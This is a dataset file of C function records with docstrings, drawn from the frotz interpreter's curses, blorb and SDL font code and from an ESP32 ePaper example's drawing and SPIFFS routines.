{"docstring": "/*\n * os_erase_area\n *\n * Fill a rectangular area of the screen with the current background\n * colour. Top left coordinates are (1,1). The cursor does not move.\n *\n * The final argument gives the window being changed, -1 if only a\n * portion of a window is being erased, or -2 if the whole screen is\n * being erased.  This is not relevant for the curses interface.\n *\n */\n", "func_signal": "void os_erase_area (int top, int left, int bottom, int right, int UNUSED(win))", "code": "{\n    int y, x, i, j;\n\n    /* Catch the most common situation and do things the easy way */\n    if ((top == 1) && (bottom == h_screen_rows) &&\n\t(left == 1) && (right == h_screen_cols)) {\n#ifdef COLOR_SUPPORT\n      /* Only set the curses background when doing an erase, so it won't\n       * interfere with the copying we do in os_scroll_area.\n       */\n      bkgdset(u_setup.current_color | ' ');\n      erase();\n      bkgdset(0);\n#else\n      erase();\n#endif\n    } else {\n        /* Sigh... */\n\tint saved_style = u_setup.current_text_style;\n\tos_set_text_style(u_setup.current_color);\n\tgetyx(stdscr, y, x);\n\ttop--; left--; bottom--; right--;\n\tfor (i = top; i <= bottom; i++) {\n\t  move(i, left);\n\t  for (j = left; j <= right; j++)\n\t    addch(' ');\n\t}\n\tmove(y, x);\n\tos_set_text_style(saved_style);\n    }\n}", "path": "src\\curses\\ux_screen.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_set_colour\n *\n * Set the foreground and background colours which can be:\n *\n *     DEFAULT_COLOUR\n *     BLACK_COLOUR\n *     RED_COLOUR\n *     GREEN_COLOUR\n *     YELLOW_COLOUR\n *     BLUE_COLOUR\n *     MAGENTA_COLOUR\n *     CYAN_COLOUR\n *     WHITE_COLOUR\n *\n *     MS-DOS 320 columns MCGA mode only:\n *\n *     GREY_COLOUR\n *\n *     Amiga only:\n *\n *     LIGHTGREY_COLOUR\n *     MEDIUMGREY_COLOUR\n *     DARKGREY_COLOUR\n *\n * There may be more colours in the range from 16 to 255; see the\n * remarks on os_peek_colour.\n *\n */\n", "func_signal": "void os_set_colour (int new_foreground, int new_background)", "code": "{\n    if (new_foreground == 1) new_foreground = h_default_foreground;\n    if (new_background == 1) new_background = h_default_background;\n    if (u_setup.color_enabled) {\n#ifdef COLOR_SUPPORT\n\tstatic int colorspace[10][10];\n\tstatic int n_colors = 0;\n\n\tif (!colorspace[new_foreground][new_background]) {\n\t  init_pair(++n_colors, unix_convert(new_foreground),\n\t\t\tunix_convert(new_background));\n\t  colorspace[new_foreground][new_background] = n_colors;\n\t}\n\tu_setup.current_color = COLOR_PAIR(colorspace[new_foreground][new_background]);\n#endif\n    } else\n      u_setup.current_color = (((new_foreground == h_default_background)\n\t\t\t&& (new_background == h_default_foreground))\n\t\t\t? A_REVERSE : 0);\n    os_set_text_style(u_setup.current_text_style);\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/**\n * Repaint a window.\n *\n * This can only be called from resize_screen.  It copies part of the screen\n * as it was before the resize onto the current screen.  The source and\n * destination rectangles may start at different rows but the columns\n * are the same.  Positions are 1-based.  win should be the index\n * of the window that is being repainted.  If it equals the current window,\n * the saved cursor position adjusted by ypos_new - ypos_old is also restored.\n *\n * The copied rectangle is clipped to the saved window size.  Returns true\n * on success, false if anything went wrong.\n */\n", "func_signal": "bool os_repaint_window(int win, int ypos_old, int ypos_new, int xpos,\n                       int ysize, int xsize)", "code": "{\n    int lines, cols;\n    if (!saved_screen)\n        return FALSE;\n    if (xsize == 0 || ysize == 0)\n        return TRUE;\n    getmaxyx(saved_screen, lines, cols);\n    ypos_old--, ypos_new--, xpos--;\n    if (xpos + xsize > cols)\n        xsize = cols - xpos;\n    if (ypos_old + ysize > lines)\n        ysize = lines - ypos_old;\n    /* Most of the time we are in os_read_line, where the cursor position\n       is different from that in the window properties.  So use the real cursor\n       position. */\n    if (win == cwin) {\n        int y, x;\n        getyx(saved_screen, y, x);\n        y += ypos_new - ypos_old;\n        if (y >= ypos_new && y< ypos_new + ysize\n            && x >= xpos && x < xpos + xsize)\n            move(y, x);\n    }\n    if (xsize <= 0 || ysize <= 0)\n        return FALSE;\n    return copywin(saved_screen, stdscr, ypos_old, xpos, ypos_new, xpos,\n                   ypos_new + ysize - 1, xpos + xsize - 1, FALSE) != ERR;\n}", "path": "src\\curses\\ux_screen.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_set_text_style\n *\n * Set the current text style. Following flags can be set:\n *\n *     REVERSE_STYLE\n *     BOLDFACE_STYLE\n *     EMPHASIS_STYLE (aka underline aka italics)\n *     FIXED_WIDTH_STYLE\n *\n */\n", "func_signal": "void os_set_text_style (int new_style)", "code": "{\n    int temp = 0;\n\n    u_setup.current_text_style = new_style;\n    if (new_style & REVERSE_STYLE) temp |= A_REVERSE;\n    if (new_style & BOLDFACE_STYLE) temp |= A_BOLD;\n    if (new_style & EMPHASIS_STYLE) temp |= A_UNDERLINE;\n    attrset(temp ^ u_setup.current_color);\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_set_font\n *\n * Set the font for text output. The interpreter takes care not to\n * choose fonts which aren't supported by the interface.\n *\n */\n", "func_signal": "void os_set_font( int new_font)", "code": "{\n//printf(\"os_set_font(%d)\\n\",new_font);\n  sf_flushtext();\n  setfont(new_font);\n  }\n\n/*\n * os_set_text_style\n *\n * Set the current text style. Following flags can be set:\n *\n *     REVERSE_STYLE\n *     BOLDFACE_STYLE\n *     EMPHASIS_STYLE (aka underline aka italics)\n *     FIXED_WIDTH_STYLE\n *\n */\nvoid os_set_text_style( int new_style)\n  {\n  sf_flushtext();\n  setstyle(new_style);\n  }\n\n/*\n * os_string_width\n *\n * Calculate the length of a word in screen units. Apart from letters,\n * the word may contain special codes:\n *\n *    ZC_NEW_STYLE - next character is a new text style\n *    ZC_NEW_FONT  - next character is a new font\n *\n */\nint os_string_width(const zchar *s)\n  {\n  int width = 0, wacc = 0, oh = 0; zword c;\n\n  setfont(current.zfontnum);\n\t// Look for style or font changes, or indents\n  sf_pushtextsettings();\n  while ((c = *s++))\n\t{\n\tif (c == ZC_NEW_STYLE)\n\t\t{\n\t\twacc += oh;\n\t\tos_set_text_style(*s++);\n\t\t}\n\telse if (c == ZC_NEW_FONT)\n\t\t{\n\t\twacc += oh;\n\t\tos_set_font(*s++);\n\t\t}\n\telse\n\t\twidth += sf_charwidth(c,&oh);\n\t}\n  sf_poptextsettings();\n\n  return (width+oh+wacc);\n  }\n\n/*\n * os_display_string\n *\n * Pass a string of characters to os_display_char.\n *\n */\nvoid os_display_string(const zchar *s)\n  {\n  zword c;\n  while ((c = *s++) != 0)\n\t{\n\tif (c == ZC_NEW_FONT)\n\t\tos_set_font(*s++);\n\telse if (c == ZC_NEW_STYLE)\n\t\tos_set_text_style(*s++);\n\telse\n\t\tos_display_char(c);\n\t}\n  }\n\n/*\n * os_display_char\n *\n * Display a character of the current font using the current colours and\n * text style. The cursor moves to the next position. Printable codes are\n * all ASCII values from 32 to 126, ISO Latin-1 characters from 160 to\n * 255, ZC_GAP (gap between two sentences) and ZC_INDENT (paragraph\n * indentation), and Unicode characters above 255. The screen should not\n * be scrolled after printing to the bottom right corner.\n *\n */\nvoid os_display_char(zchar c)\n  {\n  if (c == ZC_INDENT)\n\t{\n\tos_display_char(' ');\n\tos_display_char(' ');\n\tos_display_char(' ');\n\t}\n  else if (c == ZC_GAP)\n\t{\n\tos_display_char(' ');\n\tos_display_char(' ');\n\t}\n  else if ((c >= 32 && c <= 126) || (c >= 160))\n\t{\n\tSF_glyph *g;\n\tsetfont(current.zfontnum);\n\tg = current.font->getglyph(current.font,c,1);\n//printf(\"{%c}%d.%p/%p\",c,current.zfontnum,current.font,g);\n\tif (g)\n\t  {\n//printf(\"[%c]\\n\",c); fflush(stdout);\n\t  sf_writeglyph(g);\n\t  m_exitPause = true;\n\t  }\n\t}\n}", "path": "src\\sdl\\sf_fonts.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_char_width\n *\n * Return the width of the character in screen units.\n *\n */\n", "func_signal": "int os_char_width (zchar c)", "code": "{\n    if (c >= ZC_LATIN1_MIN && u_setup.plain_ascii) {\n\n        int width = 0;\n        const char *ptr = latin1_to_ascii + 3 * (c - ZC_LATIN1_MIN);\n\tchar c2, c3;\n\n\tptr++;\n\tc2 = *ptr++;\n\tc3 = *ptr++;\n\n\twidth++;\n\tif (c2 != ' ')\n\t  width++;\n\tif (c3 != ' ')\n\t  width++;\n\treturn width;\n    }\n    return 1;\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/* This is used for binary searching and quicksorting the resource pointer list. */\n", "func_signal": "static int sortsplot(const void *p1, const void *p2)", "code": "{\n    bb_resdesc_t *v1 = *(bb_resdesc_t **)p1;\n    bb_resdesc_t *v2 = *(bb_resdesc_t **)p2;\n    if (v1->usage < v2->usage)\n        return -1;\n    if (v1->usage > v2->usage)\n        return 1;\n    return v1->resnum - v2->resnum;\n}", "path": "src\\blorb\\blorblib.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_string_width\n *\n * Calculate the length of a word in screen units. Apart from letters,\n * the word may contain special codes:\n *\n *    NEW_STYLE - next character is a new text style\n *    NEW_FONT  - next character is a new font\n *\n */\n", "func_signal": "int os_string_width (const zchar *s)", "code": "{\n    int width = 0;\n    zchar c;\n\n    while ((c = *s++) != 0) {\n\n\tif (c == ZC_NEW_STYLE || c == ZC_NEW_FONT) {\n\t    s++;\n\t    /* No effect */\n\t} else\n\t    width += os_char_width(c);\n    }\n    return width;\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * unix_convert\n *\n * Converts frotz's (and Infocom's) color values to ncurses color values.\n *\n */\n", "func_signal": "static int unix_convert(int color)", "code": "{\n  switch(color) {\n        case BLACK_COLOUR: return COLOR_BLACK;\n        case RED_COLOUR: return COLOR_RED;\n        case GREEN_COLOUR: return COLOR_GREEN;\n        case YELLOW_COLOUR: return COLOR_YELLOW;\n        case BLUE_COLOUR: return COLOR_BLUE;\n        case MAGENTA_COLOUR: return COLOR_MAGENTA;\n        case CYAN_COLOUR: return COLOR_CYAN;\n        case WHITE_COLOUR: return COLOR_WHITE;\n  }\n  return 0;\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_more_prompt\n *\n * Display a MORE prompt, wait for a keypress and remove the MORE\n * prompt from the screen.\n *\n */\n", "func_signal": "void os_more_prompt (void)", "code": "{\n    int saved_style, saved_x, saved_y;\n\n    /* Save some useful information */\n    saved_style = u_setup.current_text_style;\n    getyx(stdscr, saved_y, saved_x);\n\n    os_set_text_style(0);\n    addstr(\"[MORE]\");\n    os_read_key(0, TRUE);\n\n    move(saved_y, saved_x);\n    addstr(\"      \");\n    move(saved_y, saved_x);\n    os_set_text_style(saved_style);\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/* os_scroll_area */\n", "func_signal": "static void save_screen(void)", "code": "{\n    if ((saved_screen = newpad(h_screen_rows, h_screen_cols))\n        && overwrite(stdscr, saved_screen) == ERR) {\n        delwin(saved_screen);\n        saved_screen = NULL;\n    }\n    if (saved_screen) {\n        int y, x;\n        getyx(stdscr, y, x);\n        wmove(saved_screen, y, x);\n    }\n}", "path": "src\\curses\\ux_screen.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/* Turn an error code into a string describing the error. */\n", "func_signal": "char *bb_err_to_string(bb_err_t err)", "code": "{\n    switch (err) {\n        case bb_err_None:\n            return \"ok\";\n        case bb_err_CompileTime:\n            return \"library compiled wrong\";\n        case bb_err_Alloc:\n            return \"cannot allocate memory\";\n        case bb_err_Read:\n            return \"cannot read from file\";\n        case bb_err_NotAMap:\n            return \"map structure is bad\";\n        case bb_err_Format:\n            return \"bad format in Blorb file\";\n        case bb_err_NotFound:\n            return \"data not found\";\n        default:\n            return \"unknown error\";\n    }\n}", "path": "src\\blorb\\blorblib.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_display_string\n *\n * Pass a string of characters to os_display_char.\n *\n */\n", "func_signal": "void os_display_string (const zchar *s)", "code": "{\n    zchar c;\n\n    while ((c = (unsigned char) *s++) != 0) {\n\n        if (c == ZC_NEW_FONT || c == ZC_NEW_STYLE) {\n\n            int arg = (unsigned char) *s++;\n\n            if (c == ZC_NEW_FONT)\n                os_set_font (arg);\n            if (c == ZC_NEW_STYLE)\n                os_set_text_style (arg);\n\n        } else\n\t    os_display_char (c);\n    }\n\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/**\n * Resize the display and redraw.  Retain the old screen starting from the\n * top left.  Call resize_screen, which may repaint more accurately.\n */\n", "func_signal": "void unix_resize_display(void)", "code": "{\n    save_screen();\n    endwin();\n    refresh();\n    resize_restore_screen();\n}", "path": "src\\curses\\ux_screen.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/* Turn a four-byte constant into a string. This returns a static buffer,\n    so if you call it twice, the old value gets overwritten. */\n", "func_signal": "char *bb_id_to_string(uint32 id)", "code": "{\n    static char buf[5];\n    buf[0] = (id >> 24) & 0xff;\n    buf[1] = (id >> 16) & 0xff;\n    buf[2] = (id >> 8) & 0xff;\n    buf[3] = (id) & 0xff;\n    buf[4] = '\\0';\n    return buf;\n}", "path": "src\\blorb\\blorblib.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/**\n * Suspend ourselves.  Save the screen and raise SIGTSTP.\n * Upon continuing restore the screen as in unix_resize_display; the terminal\n * size may have changed while we were stopped.\n */\n", "func_signal": "void unix_suspend_program(void)", "code": "{\n    save_screen();\n    raise(SIGTSTP);\n    resize_restore_screen();\n}", "path": "src\\curses\\ux_screen.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_font_data\n *\n * Return true if the given font is available. The font can be\n *\n *    TEXT_FONT\n *    PICTURE_FONT\n *    GRAPHICS_FONT\n *    FIXED_WIDTH_FONT\n *\n * The font size should be stored in \"height\" and \"width\". If\n * the given font is unavailable then these values must _not_\n * be changed.\n *\n */\n", "func_signal": "int os_font_data (int font, int *height, int *width)", "code": "{\n    if (font == TEXT_FONT) {\n      *height = 1; *width = 1; return 1; /* Truth in advertising */\n    }\n    return 0;\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/* Do some one-time startup tests. */\n", "func_signal": "static bb_err_t bb_initialize()", "code": "{\n    int i = 1;\n    char *p = (char *)&i;\n    union {\n        uint32 val;\n        unsigned char ch[4];\n    } test;\n    uint32 val;\n\n    if (p[0] == 1) bigendian = 0;\n    else bigendian = 1;\n\n    if (sizeof(uint32) != 4 || sizeof(uint16) != 2)\n        return bb_err_CompileTime; /* Basic types are the wrong size. */\n\n    test.ch[0] = 0x13;\n    test.ch[1] = 0x57;\n    test.ch[2] = 0x9a;\n    test.ch[3] = 0xce;\n    val = test.val;\n    if (bb_native4(val) != 0x13579ace)\n        return bb_err_CompileTime; /* Wrong endianness. */\n\n    return bb_err_None;\n}", "path": "src\\blorb\\blorblib.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "/*\n * os_display_char\n *\n * Display a character of the current font using the current colours and\n * text style. The cursor moves to the next position. Printable codes are\n * all ASCII values from 32 to 126, ISO Latin-1 characters from 160 to\n * 255, ZC_GAP (gap between two sentences) and ZC_INDENT (paragraph\n * indentation). The screen should not be scrolled after printing to the\n * bottom right corner.\n *\n */\n", "func_signal": "void os_display_char (zchar c)", "code": "{\n    if (c >= ZC_LATIN1_MIN) {\n        if (u_setup.plain_ascii) {\n\n\t  char *ptr = latin1_to_ascii + 3 * (c - ZC_LATIN1_MIN);\n\t  char c1 = *ptr++;\n\t  char c2 = *ptr++;\n\t  char c3 = *ptr++;\n\n\t  addch(c1);\n\n\t  if (c2 != ' ')\n\t    addch(c2);\n\t  if (c3 != ' ')\n\t    addch(c3);\n\n\t} else\n\t  addch(c);\n\treturn;\n    }\n    if (c >= ZC_ASCII_MIN && c <= ZC_ASCII_MAX) {\n        addch(c);\n\treturn;\n    }\n    if (c == ZC_INDENT) {\n      addch(' '); addch(' '); addch(' ');\n      return;\n    }\n    if (c == ZC_GAP) {\n      addch(' '); addch(' ');\n      return;\n    }\n}", "path": "src\\curses\\ux_text.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
{"docstring": "//=====================================================================================================\n", "func_signal": "void EPD_drawEllipse(uint16_t x0, uint16_t y0, uint16_t rx, uint16_t ry, color_t color, uint8_t option)", "code": "{\n\tx0 += dispWin.x1;\n\ty0 += dispWin.y1;\n\n\tuint16_t x, y;\n\tint32_t xchg, ychg;\n\tint32_t err;\n\tint32_t rxrx2;\n\tint32_t ryry2;\n\tint32_t stopx, stopy;\n\n\trxrx2 = rx;\n\trxrx2 *= rx;\n\trxrx2 *= 2;\n\n\tryry2 = ry;\n\tryry2 *= ry;\n\tryry2 *= 2;\n\n\tx = rx;\n\ty = 0;\n\n\txchg = 1;\n\txchg -= rx;\n\txchg -= rx;\n\txchg *= ry;\n\txchg *= ry;\n\n\tychg = rx;\n\tychg *= rx;\n\n\terr = 0;\n\n\tstopx = ryry2;\n\tstopx *= rx;\n\tstopy = 0;\n\n\twhile( stopx >= stopy ) {\n\t\t_draw_ellipse_section(x, y, x0, y0, color, option);\n\t\ty++;\n\t\tstopy += rxrx2;\n\t\terr += ychg;\n\t\tychg += rxrx2;\n\t\tif ( 2*err+xchg > 0 ) {\n\t\t\tx--;\n\t\t\tstopx -= ryry2;\n\t\t\terr += xchg;\n\t\t\txchg += ryry2;\n\t\t}\n\t}\n\n\tx = 0;\n\ty = ry;\n\n\txchg = ry;\n\txchg *= ry;\n\n\tychg = 1;\n\tychg -= ry;\n\tychg -= ry;\n\tychg *= rx;\n\tychg *= rx;\n\n\terr = 0;\n\n\tstopx = 0;\n\n\tstopy = rxrx2;\n\tstopy *= ry;\n\n\twhile( stopx <= stopy ) {\n\t\t_draw_ellipse_section(x, y, x0, y0, color, option);\n\t\tx++;\n\t\tstopx += ryry2;\n\t\terr += xchg;\n\t\txchg += ryry2;\n\t\tif ( 2*err+ychg > 0 ) {\n\t\t\ty--;\n\t\t\tstopy -= rxrx2;\n\t\t\terr += ychg;\n\t\t\tychg += rxrx2;\n\t\t}\n\t}\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// print non-rotated proportional character\n// character is already in fontChar\n//----------------------------------------------\n", "func_signal": "static int printProportionalChar(int x, int y)", "code": "{\n\tuint8_t ch = 0;\n\tint i, j, char_width;\n\n\tchar_width = ((fontChar.width > fontChar.xDelta) ? fontChar.width : fontChar.xDelta);\n\tint cx, cy;\n\n\tif (!font_transparent) _fillRect(x, y, char_width+1, cfont.y_size, _bg);\n\n\t// draw Glyph\n\tuint8_t mask = 0x80;\n\tfor (j=0; j < fontChar.height; j++) {\n\t\tfor (i=0; i < fontChar.width; i++) {\n\t\t\tif (((i + (j*fontChar.width)) % 8) == 0) {\n\t\t\t\tmask = 0x80;\n\t\t\t\tch = cfont.font[fontChar.dataPtr++];\n\t\t\t}\n\n\t\t\tif ((ch & mask) !=0) {\n\t\t\t\tcx = (uint16_t)(x+fontChar.xOffset+i);\n\t\t\t\tcy = (uint16_t)(y+j+fontChar.adjYOffset);\n\t\t\t\t_drawPixel(cx, cy, _fg);\n\t\t\t}\n\t\t\tmask >>= 1;\n\t\t}\n\t}\n\n\treturn char_width;\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "//=====================\n", "func_signal": "int EPD_getfontheight()", "code": "{\n  if (cfont.bitmap == 1) return cfont.y_size;\t\t\t// Bitmap font\n  else if (cfont.bitmap == 2) return _7seg_height();\t// 7-segment font\n  return 0;\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// SPIFFS_USE_MAGIC && SPIFFS_USE_MAGIC_LENGTH && SPIFFS_SINGLETON==0\n", "func_signal": "s32_t SPIFFS_mount(spiffs *fs, spiffs_config *config, u8_t *work,\n    u8_t *fd_space, u32_t fd_space_size,\n    void *cache, u32_t cache_size,\n    spiffs_check_callback check_cb_f)", "code": "{\n  void *user_data;\n  SPIFFS_LOCK(fs);\n  user_data = fs->user_data;\n  memset(fs, 0, sizeof(spiffs));\n  memcpy(&fs->cfg, config, sizeof(spiffs_config));\n  fs->user_data = user_data;\n  fs->block_count = SPIFFS_CFG_PHYS_SZ(fs) / SPIFFS_CFG_LOG_BLOCK_SZ(fs);\n  fs->work = &work[0];\n  fs->lu_work = &work[SPIFFS_CFG_LOG_PAGE_SZ(fs)];\n  memset(fd_space, 0, fd_space_size);\n  // align fd_space pointer to pointer size byte boundary\n  u8_t ptr_size = sizeof(void*);\n  u8_t addr_lsb = ((u8_t)(intptr_t)fd_space) & (ptr_size-1);\n  if (addr_lsb) {\n    fd_space += (ptr_size-addr_lsb);\n    fd_space_size -= (ptr_size-addr_lsb);\n  }\n  fs->fd_space = fd_space;\n  fs->fd_count = (fd_space_size/sizeof(spiffs_fd));\n\n  // align cache pointer to 4 byte boundary\n  addr_lsb = ((u8_t)(intptr_t)cache) & (ptr_size-1);\n  if (addr_lsb) {\n    u8_t *cache_8 = (u8_t *)cache;\n    cache_8 += (ptr_size-addr_lsb);\n    cache = cache_8;\n    cache_size -= (ptr_size-addr_lsb);\n  }\n  if (cache_size & (ptr_size-1)) {\n    cache_size -= (cache_size & (ptr_size-1));\n  }\n\n#if SPIFFS_CACHE\n  fs->cache = cache;\n  fs->cache_size = (cache_size > (SPIFFS_CFG_LOG_PAGE_SZ(fs)*32)) ? SPIFFS_CFG_LOG_PAGE_SZ(fs)*32 : cache_size;\n  spiffs_cache_init(fs);\n#endif\n\n  s32_t res;\n\n#if SPIFFS_USE_MAGIC\n  res = SPIFFS_CHECK_MAGIC_POSSIBLE(fs) ? SPIFFS_OK : SPIFFS_ERR_MAGIC_NOT_POSSIBLE;\n  SPIFFS_API_CHECK_RES_UNLOCK(fs, res);\n#endif\n\n  fs->config_magic = SPIFFS_CONFIG_MAGIC;\n\n  res = spiffs_obj_lu_scan(fs);\n  SPIFFS_API_CHECK_RES_UNLOCK(fs, res);\n\n  SPIFFS_DBG(\"page index byte len:         \"_SPIPRIi\"\\n\", (u32_t)SPIFFS_CFG_LOG_PAGE_SZ(fs));\n  SPIFFS_DBG(\"object lookup pages:         \"_SPIPRIi\"\\n\", (u32_t)SPIFFS_OBJ_LOOKUP_PAGES(fs));\n  SPIFFS_DBG(\"page pages per block:        \"_SPIPRIi\"\\n\", (u32_t)SPIFFS_PAGES_PER_BLOCK(fs));\n  SPIFFS_DBG(\"page header length:          \"_SPIPRIi\"\\n\", (u32_t)sizeof(spiffs_page_header));\n  SPIFFS_DBG(\"object header index entries: \"_SPIPRIi\"\\n\", (u32_t)SPIFFS_OBJ_HDR_IX_LEN(fs));\n  SPIFFS_DBG(\"object index entries:        \"_SPIPRIi\"\\n\", (u32_t)SPIFFS_OBJ_IX_LEN(fs));\n  SPIFFS_DBG(\"available file descriptors:  \"_SPIPRIi\"\\n\", (u32_t)fs->fd_count);\n  SPIFFS_DBG(\"free blocks:                 \"_SPIPRIi\"\\n\", (u32_t)fs->free_blocks);\n\n  fs->check_cb_f = check_cb_f;\n\n  fs->mounted = 1;\n\n  SPIFFS_UNLOCK(fs);\n\n  return 0;\n}", "path": "components\\spiffs\\spiffs_hydrogen.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// unrefers all fds that this cache page refers to and releases the cache page\n", "func_signal": "void spiffs_cache_fd_release(spiffs *fs, spiffs_cache_page *cp)", "code": "{\n  if (cp == 0) return;\n  u32_t i;\n  spiffs_fd *fds = (spiffs_fd *)fs->fd_space;\n  for (i = 0; i < fs->fd_count; i++) {\n    spiffs_fd *cur_fd = &fds[i];\n    if (cur_fd->file_nbr != 0 && cur_fd->cache_page == cp) {\n      cur_fd->cache_page = 0;\n    }\n  }\n  spiffs_cache_page_free(fs, cp->ix, 0);\n\n  cp->obj_id = 0;\n}", "path": "components\\spiffs\\spiffs_cache.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "//====================================================================\n", "func_signal": "void EPD_fillCircle(int16_t x, int16_t y, int radius, color_t color)", "code": "{\n\tx += dispWin.x1;\n\ty += dispWin.y1;\n\n\t_drawFastVLine(x, y-radius, 2*radius+1, color);\n\tfillCircleHelper(x, y, radius, 3, 0, color);\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "//---------------------------------------------------------------------------------------------------------------------------------\n", "func_signal": "static void _fillArcOffsetted(uint16_t cx, uint16_t cy, uint16_t radius, uint16_t thickness, float start, float end, color_t color)", "code": "{\n\t//float sslope = (float)cos_lookup(start) / (float)sin_lookup(start);\n\t//float eslope = (float)cos_lookup(end) / (float)sin_lookup(end);\n\tfloat sslope = (cos(start/_arcAngleMax * 2 * PI) * _arcAngleMax) / (sin(start/_arcAngleMax * 2 * PI) * _arcAngleMax) ;\n\tfloat eslope = (cos(end/_arcAngleMax * 2 * PI) * _arcAngleMax) / (sin(end/_arcAngleMax * 2 * PI) * _arcAngleMax);\n\n\tif (end == 360) eslope = -1000000;\n\n\tint ir2 = (radius - thickness) * (radius - thickness);\n\tint or2 = radius * radius;\n\n\tfor (int x = -radius; x <= radius; x++) {\n\t\tfor (int y = -radius; y <= radius; y++) {\n\t\t\tint x2 = x * x;\n\t\t\tint y2 = y * y;\n\n\t\t\tif (\n\t\t\t\t(x2 + y2 < or2 && x2 + y2 >= ir2) &&\n\t\t\t\t(\n\t\t\t\t(y > 0 && start < 180 && x <= y * sslope) ||\n\t\t\t\t(y < 0 && start > 180 && x >= y * sslope) ||\n\t\t\t\t(y < 0 && start <= 180) ||\n\t\t\t\t(y == 0 && start <= 180 && x < 0) ||\n\t\t\t\t(y == 0 && start == 0 && x > 0)\n\t\t\t\t) &&\n\t\t\t\t(\n\t\t\t\t(y > 0 && end < 180 && x >= y * eslope) ||\n\t\t\t\t(y < 0 && end > 180 && x <= y * eslope) ||\n\t\t\t\t(y > 0 && end >= 180) ||\n\t\t\t\t(y == 0 && end >= 180 && x < 0) ||\n\t\t\t\t(y == 0 && start == 0 && x > 0)\n\t\t\t\t)\n\t\t\t\t)\n\t\t\t\t_drawPixel(cx+x, cy+y, color);\n\t\t}\n\t}\n}", "path": "components\\epaper\\EPD.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
{"docstring": "// returns the cache page that this fd refers, or null if no cache page\n", "func_signal": "spiffs_cache_page *spiffs_cache_page_get_by_fd(spiffs *fs, spiffs_fd *fd)", "code": "{\n  spiffs_cache *cache = spiffs_get_cache(fs);\n\n  if ((cache->cpage_use_map & cache->cpage_use_mask) == 0) {\n    // all cpages free, no cpage cannot be assigned to obj_id\n    return 0;\n  }\n\n  int i;\n  for (i = 0; i < cache->cpage_count; i++) {\n    spiffs_cache_page *cp = spiffs_get_cache_page_hdr(fs, cache, i);\n    if ((cache->cpage_use_map & (1<<i)) &&\n        (cp->flags & SPIFFS_CACHE_FLAG_TYPE_WR) &&\n        cp->obj_id == fd->obj_id) {\n      return cp;\n    }\n  }\n\n  return 0;\n}", "path": "components\\spiffs\\spiffs_cache.c", "repo_name": "loboris/ESP32_ePaper_example", "stars": 194, "license": "None", "language": "c", "size": 16832}
